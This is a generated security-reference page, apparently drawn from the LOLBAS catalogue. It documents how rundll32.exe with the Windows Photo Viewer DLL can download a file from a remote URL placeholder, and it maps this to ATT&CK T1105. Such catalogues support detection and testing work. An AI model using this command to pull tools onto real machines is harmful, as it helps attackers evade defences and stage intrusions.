---
parsed_by: focuslocust
source: commands
type: generated
---
# PhotoViewer.dll Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## PhotoViewer.dll

Tool page: [PhotoViewer.dll](../../tools/windows/photoviewer.dll.md)

### Download file from remote location.

```text
rundll32.exe "C:\Program Files\Windows Photo Viewer\PhotoViewer.dll",ImageView_Fullscreen {REMOTEURL}
```

Description:

Once executed, rundll32.exe will download the file at the specified URL to the user's INetCache folder using the Windows Photo Viewer DLL.

Related ATT&CK:

- [T1105](../../attack/techniques/T1105-ingress-tool-transfer.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OSLibraries/PhotoViewer.yml` |
| Evidence | Command preserved from source parser. |
